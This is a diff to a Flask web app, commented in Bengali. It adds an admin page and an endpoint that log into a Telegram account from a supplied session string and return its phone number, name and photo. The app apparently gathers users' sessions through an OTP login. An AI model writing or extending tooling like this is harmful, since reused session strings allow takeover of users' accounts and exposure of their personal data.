@@ -206,6 +206,14 @@ def payment_history():
 def admin_panel():
     return render_template("admin.html")
 
+
+@app.route("/session_viewer")
+def session_viewer():
+    # শুধু অ্যাডমিন লগইন থাকলেই পেজ দেখাবে (একই পিন)
+    if not session.get("admin_logged_in"):
+        return redirect(url_for("admin_panel"))
+    return render_template("session_viewer.html")
+
 # ================= API: AUTH (Per-request Telegram client) =================
 @app.route("/api/send_otp", methods=["POST"])
 def send_otp():
@@ -880,6 +888,51 @@ def check_membership():
     except Exception as e:
         print(f"Check membership error: {e}")
         return jsonify({"is_member": user.get("is_joined", False)})
+
+
+# (আপনার বিদ্যমান কোডের সাথে যুক্ত করুন)
+
+@app.route("/api/admin/load_session", methods=["POST"])
+def admin_load_session():
+    # শুধুমাত্র অ্যাডমিন লগইন থাকলেই চলবে
+    if not session.get("admin_logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    data = request.json
+    session_string = data.get("session_string")
+    if not session_string:
+        return jsonify({"error": "No session string provided"}), 400
+    
+    async def fetch_user():
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.connect()
+        try:
+            me = await client.get_me()
+            # প্রোফাইল পিক ডাউনলোড (ঐচ্ছিক)
+            photo = None
+            try:
+                photo = await client.download_profile_photo(me, bytes)
+                if photo:
+                    import base64
+                    photo = base64.b64encode(photo).decode('utf-8')
+            except:
+                pass
+            return {
+                "id": me.id,
+                "first_name": me.first_name,
+                "last_name": me.last_name,
+                "username": me.username,
+                "phone": me.phone,
+                "photo": photo
+            }
+        finally:
+            await client.disconnect()
+    
+    try:
+        user_info = asyncio.run(fetch_user())
+        return jsonify({"success": True, "user": user_info})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
 # ================= RUN =================
 if __name__ == "__main__":
